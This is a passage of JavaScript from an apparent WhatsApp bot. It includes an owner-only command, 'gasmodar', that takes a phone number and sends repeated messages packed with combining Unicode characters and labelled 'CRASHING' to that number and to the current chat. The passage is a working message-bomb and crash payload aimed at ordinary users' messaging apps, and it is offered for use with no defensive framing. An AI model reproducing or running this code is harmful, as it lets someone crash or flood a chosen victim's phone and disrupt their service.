𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    m.reply(`SUCCES`)
                     }
                break
case 'gasmodar' : {
                    if (!isCreator) return
                    if (!text) throw `Nomernya mana?`
                    a = await hisoka.sendMessage(`${text}@s.whatsapp.net`, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
